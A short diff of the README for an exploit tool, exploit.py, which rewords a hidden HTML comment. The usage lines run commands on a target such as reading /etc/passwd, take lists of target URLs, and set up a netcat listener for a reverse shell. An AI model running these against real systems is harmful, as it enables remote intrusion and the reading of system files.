@@ -19,7 +19,7 @@ exploit.py [-h] [-u URL] [-c COMMAND] [-f FILE]
 python3 exploit.py -u https://target_IP -c 'cat /etc/passwd'
 python3 exploit.py -f urls.txt
 ```
-<!-- Here is an egg hunt for inquiring minds ;-)
+<!-- Here is an Easter Egg for inquiring minds ;-)
 - Reverse Shell:
 ```
 nc -nvlp 8888
